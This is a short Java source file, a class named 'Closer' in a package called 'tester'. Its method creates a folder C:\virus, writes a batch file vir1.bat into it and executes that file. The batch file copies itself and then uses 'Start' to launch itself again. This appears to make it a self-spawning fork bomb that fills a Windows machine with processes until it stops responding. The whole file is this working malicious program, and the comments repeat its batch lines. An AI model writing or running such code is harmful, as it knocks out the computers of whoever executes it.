
package tester;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;



public class Closer 
{   
    
    //@echo off
    //copy C:\doit\virus.bat C:\doit
    //Start C:\doit\virus.bat
    
   static String s = "C:\\virus\\vir1.bat";
   static String s1 = "@echo off";
   static String s2 = "copy C:\\virus\\vir1.bat C:\\virus";
   static String s3 = "Start C:\\virus\\vir1.bat";
    public static void main1(String[] a) throws IOException
    {
        File f = new File("C:\\virus");
        f.mkdir();
       
       try {
          
           FileWriter fw = new FileWriter(s);
           BufferedWriter bw = new BufferedWriter(fw);
           bw.write(s1);
           bw.newLine();
           bw.write(s2);
           bw.newLine();
           bw.write(s3);
           bw.close();
           
       } catch (Exception ex) {
          System.err.println(ex.getMessage());
       }
       
       
       f = new File(s);
       if(!f.exists())
        {
             throw new IllegalArgumentException("file " + s + " does not exist");
        }
       else 
        {
            System.out.println("opening file "+s);
            Process p = Runtime.getRuntime().exec(f.getAbsolutePath());
        }
    }
}
